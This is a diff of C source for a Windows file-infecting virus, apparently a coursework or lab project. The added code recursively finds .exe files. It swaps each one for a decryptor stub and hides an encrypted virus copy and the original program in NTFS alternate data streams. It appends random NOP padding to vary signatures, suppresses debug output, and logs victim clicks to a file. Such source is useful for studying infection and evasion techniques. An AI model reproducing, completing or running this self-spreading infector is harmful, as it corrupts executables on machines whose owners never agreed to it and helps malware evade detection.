@@ -9,24 +9,27 @@
 
 
 
-
+#include<time.h>
 #include<io.h>
 #include<stdio.h>
 #include <unistd.h>
 #include <dirent.h>
 #include <string.h>
 #include <stdlib.h>
+#include <sys/types.h>
 
-
-#define MAXSIZE 200
-void get_exe_file();
+#define MAXSIZE 2048
+void get_exe_file(char path[MAXSIZE]);
 //char oldprogram_name[MAXSIZE];
-int verbose=1;
+int verbose=0;
 char virus_abs_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus\\virus.exe";
 char dec_abs_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus\\dec.exe";
 char haking_text_path[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus";
 
+char mail[MAXSIZE]="c:\\cygwin\\home\\Administrator\\virus\\send_email.txt";
 
+
+void nop_injection(char key[MAXSIZE]);
 char* findfiles(char directory[MAXSIZE]);
 void check_infect(char path[MAXSIZE]);
 void infect(char file_path[MAXSIZE]);
@@ -35,35 +38,41 @@ int main(int argc,char* argv[])
 	char command[MAXSIZE];
     //sprintf(oldprogram_name,"%s",argv[0]);
    
-    //get_exe_file("c:\\cygwin\\home\\Administrator\\my_virus");
+    get_exe_file(haking_text_path);
 	                      
-   // get_exe_file("*");
-   
-   //XXX: find files may change to  ".\\"..
-   //findfiles("./");
-	get_exe_file(haking_text_path);
+    //get_exe_file(haking_text_path);
+  
+    //findfiles("./");
+	//findfiles("./");
 	//payload
 	printf("Virus !!!\n");
 	system("pause");
 	
 	if(argc==2){
-		sprintf(command,"echo victim clicked %s >> send_email.txt",argv[1],haking_text_path);
+		sprintf(command,"echo victim clicked %s >> %s",argv[1],mail);
 		
 		system(command);
 	}
 	else if(argc==1){
-		sprintf(command,"echo victim clicked virus.exe >> send_email.txt",haking_text_path);
+		sprintf(command,"echo victim clicked virus.exe >> %s",mail);
 		system(command);
 	}
 	
 	//start oldprogram
 	if(argc==2){
+		sprintf(command,"del tmp_dec_virus.exe");
+		if(verbose==1) printf("%s\n",command);
+		
 		
 		sprintf(command,"start ./%s:oldprogram.exe",argv[1]);
-		printf("%s\n",command);
+		if(verbose==1) printf("%s\n",command);
 		system(command);
+		//del temp_dec.exe
+		system("del tmp_dec_virus.exe");
+		
+	    
 	}
-
+     
 	
     return 0;
 }
@@ -88,13 +97,13 @@ char * findfiles(char directory[MAXSIZE])
 
     if( (fHandle=_findfirst( "*.exe", &fileinfo )) == -1L ) 
     {
-        printf( "no any exe files\n");
+        //printf( "no any exe files\n");
         return 0;
     }
     else{
         do{
             i ++;
-            printf( "find txt file:%s\n", fileinfo.name);
+            //printf( "find exe file:%s\n", fileinfo.name);
 			sprintf(target,"%s",fileinfo.name);
 			check_infect(target);
         }while( _findnext(fHandle,&fileinfo)==0);
@@ -106,19 +115,34 @@ char * findfiles(char directory[MAXSIZE])
 }
 
 void check_infect(char path[MAXSIZE]){
+	char folder_name[MAXSIZE];
+	char temp_dir[MAXSIZE];
+	sprintf(folder_name,"%s",path);
+	char * pch1;
+	pch1=strrchr(folder_name,'\\');
+	//printf ("Last occurence of '\\' found at %d \n",pch1-folder_name+1);
+	folder_name[pch1-folder_name] = '\0';
+	//printf("cur foler name: %s\n",folder_name);
+    char abs_tmp_path[MAXSIZE];
+	sprintf(abs_tmp_path,"%s\\tmp_dec_virus.exe",folder_name);
+
+
+
 	char virus_exe[MAXSIZE];
 	FILE* fp=NULL;
 	sprintf(virus_exe,"%s:oldprogram.exe",path);
 	
 	if (verbose==1) printf("check exist: %s  ",virus_exe);
+	//TODO: change tmp_dec_virus to ABS PATH!!!!
 	
-    if(strcmp(path,"virus.exe")==0 ||strcmp(path,"dec.exe")==0 ){
+    if(strcmp(path,virus_abs_path)==0 ||strcmp(path,dec_abs_path)==0 || strcmp(path,abs_tmp_path)==0 ){
 		if (verbose==1) printf("---> Mother, don't infect\n");
 	    
 	}else{
 		fp = fopen(virus_exe,"rb+");
 		if(fp==NULL){
 			if (verbose==1) printf("---> not infected\n");
+			//printf("infect: %s\n",path);
 			infect(path);
 		}
 		else{
@@ -131,6 +155,23 @@ void check_infect(char path[MAXSIZE]){
 }
 
 void infect(char file_path[MAXSIZE]){
+	char folder_name[MAXSIZE];
+	char temp_dir[MAXSIZE];
+	sprintf(folder_name,"%s",file_path);
+	char * pch1;
+	pch1=strrchr(folder_name,'\\');
+	//printf ("Last occurence of '\\' found at %d \n",pch1-folder_name+1);
+	folder_name[pch1-folder_name] = '\0';
+	//printf("cur foler name: %s\n",folder_name);
+	
+	//DIR *dir;
+    //struct dirent *dent;
+    //dir = opendir(folder_name);
+	//if(dir==NULL) return;
+	chdir(folder_name);
+	char what_cmd[MAXSIZE];
+	//sprintf(what_cmd,"echo %s > what.txt");
+	//system(what_cmd);
 	//1.get file_name
 	char key[MAXSIZE],oldprogram_name[MAXSIZE],victim_path[MAXSIZE];
 	char* pch;
@@ -145,7 +186,7 @@ void infect(char file_path[MAXSIZE]){
 	sprintf(oldprogram_name,"%s:oldprogram.exe",key);
 	if (verbose==1) {
 		printf("key name           :    %s\n",key);	
-		printf("oldprogram         :  %s\n",file_path);
+		//printf("oldprogram         :  %s\n",file_path);
 		printf("injected oldprogram:  %s\n",oldprogram_name);
 	}
 	
@@ -160,8 +201,8 @@ void infect(char file_path[MAXSIZE]){
 	}
 
 	char command[MAXSIZE];
-	sprintf(command,"echo %s > what.txt",key);
-	system(command);
+	//sprintf(command,"echo %s > what.txt",key);
+	//system(command);
 	
 
 	//decrypt virus.exe
@@ -170,13 +211,18 @@ void infect(char file_path[MAXSIZE]){
 	int file_size=0;
 	pFile_enc_virus = fopen(virus_abs_path,"rb");
 	if(!pFile_enc_virus){
-		printf("error open file virus.exe\n");
+		//printf("error open file virus.exe\n");
 		exit(1);
 	}
 	
+	
+	
+	//sprintf(temp_dir,"%s\\temp_encypted_virus.exe");
+	
+	
 	pFile_dec_virus = fopen("temp_encypted_virus.exe","wb");
 	if(!pFile_dec_virus){
-		printf("error open file temp_enc.exe\n");
+		//printf("error open file temp_enc.exe\n");
 		exit(1);
 	}
 	
@@ -201,43 +247,85 @@ void infect(char file_path[MAXSIZE]){
 	
 	
 	
+	
 	//3.  replace oldprogram with dec.exe
-	if(verbose==1){
-		printf("copy %s to temp_oldprogram.exe\n",key);
-	}
+	
 	sprintf(command,"copy %s temp_oldprogram.exe > null",key);
+	if(verbose==1){ printf("command --- %s/n",command);}
 	system(command);
 	
 	sprintf(command,"del %s > null",key);
+	if(verbose==1){ printf("command --- %s/n",command);}
 	system(command);
 	
 	sprintf(command,"copy %s %s > null",dec_abs_path,key);
+	if(verbose==1){ printf("command --- %s/n",command);}
 	system(command);
 	
+	//ADD JUNK NOP into dec.exe.
+	nop_injection(key);
 	
 	
 	//4.1 : ads dec.exe:virus.exe
-	if(verbose==1){
-		printf("TYPE temp_encypted_virus.exe > %s:virus.exe\n",key);
-	}
 	sprintf(command,"TYPE temp_encypted_virus.exe > %s:virus.exe",key);
-	//sprintf(command,"TYPE virus.exe > %s:virus.exe",key);
+	if(verbose==1){ printf("command --- %s/n",command);}
 	system(command);
+	//sprintf(command,"TYPE virus.exe > %s:virus.exe",key);
+	
 	//4.2 : ads dec.exe:oldprogram.exe
-	if(verbose==1){
-		printf("TYPE temp_oldprogram.exe > %s:oldprogram.exe\n",key);
-	}
 	sprintf(command,"TYPE temp_oldprogram.exe > %s:oldprogram.exe",key);
+	if(verbose==1){ printf("command --- %s/n",command);}
+	system(command);
 	system(command);
 	
 	
 	//del
+	//printf("del temp_*.exe > null/n");
 	system("del temp_*.exe > null");
 	
-	printf("------------------------------\n\n\n");
+	//closedir(dir);
+	chdir(haking_text_path);
+	
+	if(verbose==1) printf("------------------------------\n\n\n");
 	
 	
 }
+
+void nop_injection(char file[MAXSIZE]){
+	//decrypt virus.exe
+	FILE* pFile=NULL;
+
+	int file_size=0;
+	
+	pFile = fopen(file,"awb");
+	if(!pFile){
+		if(verbose==1) printf("error open file temp_enc.exe\n");
+		exit(1);
+	}
+	
+	fseek(pFile,0,SEEK_END);
+
+	
+	
+	int how_many;
+	unsigned char c;
+	//int seed =  time(&second);
+	srand(time(NULL));
+    how_many = rand()%100*strlen(file)+strlen(file);
+	//time = seed/rand;
+	c = strtol("10010000",NULL,2);
+	for(int i=0;i<how_many;i++){
+		fwrite(&c,sizeof(c),1,pFile);
+        
+    }
+	fclose(pFile);
+	
+	
+	
+}
+
+
+
 
 
 void get_exe_file(char path[MAXSIZE]){
@@ -248,28 +336,39 @@ void get_exe_file(char path[MAXSIZE]){
     char dir_path[MAXSIZE];
 	char next_dir_path[MAXSIZE];
 
-	sprintf(dir_path,"%s",path);
-	printf("dir %s\n",dir_path);
+	sprintf(dir_path,"%s\\*",path);
+	if(verbose==1) printf("dir %s\n",dir_path);
     if( (fHandle=_findfirst( dir_path, &fileinfo )) == -1L ) 
     {
-       // printf( "no any exe files\n");
+        //printf( "no any exe files\n");
      
     }
     else{
         do{
 			if((fileinfo.attrib & _A_SUBDIR)){
-				if(strcmp(fileinfo.name,".") != 0 && strcmp(fileinfo.name,"..") != 0 && strcmp(fileinfo.name,"virus")!=0) 
-					sprintf(next_dir_path,"%s\\%s",dir_path, fileinfo.name);
-				    printf("find folder %s\n",next_dir_path);
-					get_exe_file(next_dir_path);
+				if(strcmp(fileinfo.name,".") != 0 && strcmp(fileinfo.name,"..") != 0)
+					
+				    
+					sprintf(next_dir_path,"%s\\%s",path,fileinfo.name);
+					if(strcmp(haking_text_path,next_dir_path)<0){
+						//printf("find folder %s\n",next_dir_path);
+					  
+
+					  get_exe_file(next_dir_path);
+					  
+					}
+					
 			}
 			else{
+					int length=strlen(fileinfo.name);
+					if (strncmp(fileinfo.name + length - 4, ".exe", 4) == 0) {
+					//("FILE find");
+					i ++;
+					char file_path[MAXSIZE];
+					sprintf(file_path,"%s\\%s",path,fileinfo.name);
+					if(verbose==1)printf( "find exe file:%s \n", file_path);
+					check_infect(file_path);
 				
-			    printf("FILE find");
-				int length=strlen(fileinfo.name);
-				if (strncmp(fileinfo.name + length - 4, ".exe", 4) == 0) {
-				    i ++;
-				    printf( "find exe file:%s \n", fileinfo.name);
 				}
 			}
         }while( _findnext(fHandle,&fileinfo)==0);
@@ -277,7 +376,7 @@ void get_exe_file(char path[MAXSIZE]){
    
     _findclose( fHandle );
 
-    printf("total num: %d\n",i);
-	
-	
 }
+	
+	
+
